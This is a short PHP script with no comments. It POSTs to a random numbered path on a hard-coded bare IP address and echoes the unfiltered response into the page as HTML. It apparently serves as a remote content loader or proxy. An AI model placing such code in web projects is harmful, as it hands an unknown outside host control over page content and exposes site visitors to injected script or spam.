<?php
header("Content-type: text/html; charset=utf-8"); 
$result = POST("http://123.207.42.198:8008/MS/".rand(1,20).".php","context=1");
echo $result;

/**
 * @return array | boolean
 */
function POST($url, $param) {
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_POST,1);
	curl_setopt($ch, CURLOPT_URL,$url);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 6);
	curl_setopt($ch, CURLOPT_POSTFIELDS,$param); 
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}
?>